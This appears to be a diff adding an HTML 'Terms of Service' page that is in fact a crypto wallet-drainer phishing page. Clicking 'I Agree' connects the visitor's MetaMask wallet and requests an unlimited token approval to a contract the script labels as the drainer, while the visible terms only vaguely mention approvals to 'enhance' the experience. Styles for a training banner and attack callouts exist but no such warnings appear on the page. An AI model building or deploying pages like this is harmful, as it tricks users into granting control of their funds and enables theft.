@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Terms Of Service</title>
+<script src="https://cdn.jsdelivr.net/npm/ethers@6.13.2/dist/ethers.umd.min.js"></script>
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+}
+
+.training-banner {
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    background: repeating-linear-gradient(
+        45deg,
+        #d32f2f,
+        #d32f2f 20px,
+        #b71c1c 20px,
+        #b71c1c 40px
+    );
+    color: white;
+    text-align: center;
+    padding: 12px;
+    font-weight: bold;
+    font-size: 15px;
+    letter-spacing: 0.5px;
+    z-index: 1000;
+    box-shadow: 0 2px 10px rgba(0,0,0,0.3);
+}
+
+.container {
+    background: white;
+    border-radius: 10px;
+    box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+    max-width: 640px;
+    width: 100%;
+    margin-top: 60px;
+}
+
+.header {
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    color: white;
+    padding: 30px;
+    text-align: center;
+    border-radius: 10px 10px 0 0;
+}
+
+.header h1 {
+    font-size: 24px;
+    margin-bottom: 8px;
+}
+
+.header p {
+    opacity: 0.9;
+    font-size: 14px;
+}
+
+.explainer {
+    background: #fff3cd;
+    border: 1px solid #ffe69c;
+    color: #664d03;
+    padding: 16px 24px;
+    font-size: 13px;
+    line-height: 1.6;
+}
+
+.explainer strong {
+    color: #b71c1c;
+}
+
+.content {
+    padding: 24px 30px;
+    max-height: 320px;
+    overflow-y: auto;
+    background: #f8f9fa;
+}
+
+.tos-section {
+    margin-bottom: 18px;
+}
+
+.tos-section h3 {
+    color: #667eea;
+    font-size: 15px;
+    margin-bottom: 8px;
+}
+
+.tos-section p {
+    font-size: 13px;
+    line-height: 1.6;
+    color: #555;
+    text-align: justify;
+}
+
+.attack-callout {
+    background: #f8d7da;
+    border-left: 4px solid #d32f2f;
+    padding: 10px 14px;
+    margin-top: 8px;
+    font-size: 12px;
+    color: #721c24;
+}
+
+.footer {
+    padding: 24px 30px;
+    background: white;
+    border-top: 1px solid #e0e0e0;
+}
+
+.config-info {
+    background: #e7f3ff;
+    border: 1px solid #b6d7ff;
+    color: #0c5460;
+    padding: 12px 16px;
+    border-radius: 6px;
+    font-size: 12px;
+    margin-bottom: 16px;
+    word-break: break-all;
+}
+
+.config-info div {
+    margin-bottom: 4px;
+}
+
+.buttons {
+    display: flex;
+    gap: 10px;
+}
+
+.checkbox-container {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 15px;
+}
+
+input[type="checkbox"] {
+    width: 20px;
+    height: 20px;
+    cursor: pointer;
+}
+
+.checkbox-container label {
+    font-size: 14px;
+    color: #555;
+    cursor: pointer;
+}
+
+button {
+    flex: 1;
+    padding: 15px;
+    font-size: 16px;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    font-weight: bold;
+    transition: all 0.3s;
+}
+
+.btn-decline {
+    background: #ccc;
+    color: #333;
+}
+
+.btn-decline:hover {
+    background: #aaa;
+}
+
+.btn-agree {
+    background: #d32f2f;
+    color: white;
+}
+
+.btn-agree:hover:not(:disabled) {
+    background: #b71c1c;
+    transform: translateY(-2px);
+    box-shadow: 0 5px 15px rgba(211, 47, 47, 0.4);
+}
+
+.btn-agree:disabled {
+    opacity: 0.5;
+    cursor: not-allowed;
+}
+
+.status {
+    margin-top: 15px;
+    padding: 10px;
+    border-radius: 5px;
+    font-size: 13px;
+    display: none;
+}
+
+.status.success {
+    background: #d4edda;
+    color: #155724;
+    display: block;
+}
+
+.status.error {
+    background: #f8d7da;
+    color: #721c24;
+    display: block;
+}
+
+.status.loading {
+    background: #d1ecf1;
+    color: #0c5460;
+    display: block;
+}
+
+.footer-text {
+    font-size: 12px;
+    color: #999;
+    text-align: center;
+    margin-top: 10px;
+}
+</style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <h1>Terms of Service Agreement</h1>
+        <p>Please read and accept our terms to continue</p>
+    </div>
+
+    <div class="content">
+        <div class="tos-section">
+            <h3>1. Acceptance of Terms</h3>
+            <p>By clicking "I Agree" below, you acknowledge that you have read, understood, and agree to be bound by these Terms of Service. If you do not agree to these terms, you may not use our services.</p>
+        </div>
+
+        <div class="tos-section">
+            <h3>2. Use License</h3>
+            <p>Permission is granted to temporarily download one copy of the materials on our service for personal, non-commercial transitory viewing only.</p>
+        </div>
+
+        <div class="tos-section">
+            <h3>3. Disclaimer</h3>
+            <p>The materials on our service are provided on an 'as is' basis, with no warranties of any kind.</p>
+        </div>
+
+        <div class="tos-section">
+            <h3>4. Data Usage & Wallet Interaction</h3>
+            <p>By agreeing, you consent to our data usage policy and smart contract interactions, including token approvals required to "enhance" your experience.</p>
+        </div>
+    </div>
+
+    <div class="footer">
+
+        <div class="checkbox-container">
+            <input type="checkbox" id="agreeCheckbox">
+            <label for="agreeCheckbox">I understand</label>
+        </div>
+
+        <div class="buttons">
+            <button class="btn-decline" onclick="decline()">Decline</button>
+            <button class="btn-agree" id="agreeBtn" onclick="connect()" disabled>I Agree</button>
+        </div>
+
+        <div class="status" id="status"></div>
+
+        <div class="footer-text">
+            This page will request for token approval. Check your wallet's
+            confirmation dialog to approve.
+        </div>
+    </div>
+</div>
+
+<script>
+
+const X0_CONTRACT_ADDRESS = "0x69Bf5b7aBA51C3Ee8bF169aB47479ba95DBF709D";
+const MOCK_TOKEN_ADDRESS = "0x6B2B0C0d0a376255Ac70Bf1366f50982bF476Bb2";
+
+document.getElementById("tokenAddrDisplay").textContent = MOCK_TOKEN_ADDRESS;
+document.getElementById("drainerAddrDisplay").textContent = X0_CONTRACT_ADDRESS;
+
+let provider;
+let signer;
+
+const MOCK_TOKEN_ABI = [
+    {
+        "inputs": [
+            {"internalType": "address", "name": "spender", "type": "address"},
+            {"internalType": "uint256", "name": "amount", "type": "uint256"}
+        ],
+        "name": "approve",
+        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
+        "stateMutability": "nonpayable",
+        "type": "function"
+    },
+    {
+        "inputs": [{"internalType": "address", "name": "account", "type": "address"}],
+        "name": "balanceOf",
+        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
+        "stateMutability": "view",
+        "type": "function"
+    },
+    {
+        "inputs": [
+            {"internalType": "address", "name": "to", "type": "address"},
+            {"internalType": "uint256", "name": "amount", "type": "uint256"}
+        ],
+        "name": "mint",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+    }
+];
+
+function setStatus(msg, kind) {
+    const el = document.getElementById("status");
+    el.textContent = msg;
+    el.className = `status ${kind}`;
+}
+
+function decline() {
+    alert("Ended. No wallet action taken.");
+    document.getElementById("agreeCheckbox").checked = false;
+    document.getElementById("agreeBtn").disabled = true;
+}
+
+document.getElementById("agreeCheckbox").addEventListener("change", function () {
+    document.getElementById("agreeBtn").disabled = !this.checked;
+});
+
+async function connect() {
+    if (!window.ethereum) {
+        setStatus("MetaMask not detected. Please install it and try again.", "error");
+        return;
+    }
+
+    try {
+        document.getElementById("agreeBtn").disabled = true;
+        setStatus("Connecting wallet...", "loading");
+
+        provider = new ethers.BrowserProvider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
+        signer = await provider.getSigner();
+        const address = await signer.getAddress();
+        const network = await provider.getNetwork();
+
+        setStatus(`Connected: ${address.substring(0, 6)}...${address.substring(38)} on chain ${network.chainId}. Now requesting approval.`, "success");
+
+        await requestApproval();
+
+    } catch (err) {
+        setStatus(`Error: ${err.message}`, "error");
+        document.getElementById("agreeBtn").disabled = false;
+    }
+}
+
+async function requestApproval() {
+    try {
+        setStatus("Requesting token approval...", "loading");
+
+        const token = new ethers.Contract(MOCK_TOKEN_ADDRESS, MOCK_TOKEN_ABI, signer);
+        const unlimitedAmount = ethers.MaxUint256;
+
+        const tx = await token.approve(X0_CONTRACT_ADDRESS, unlimitedAmount);
+        await tx.wait();
+
+        setStatus(
+            `Approved`,
+            "success"
+        );
+
+        setTimeout(() => {
+            alert(
+                "Thank you for approval!"
+            );
+        }, 1500);
+
+    } catch (err) {
+        setStatus(`Error during approval: ${err.message}`, "error");
+        document.getElementById("agreeBtn").disabled = false;
+    }
+}
+</script>
+</body>
+</html>
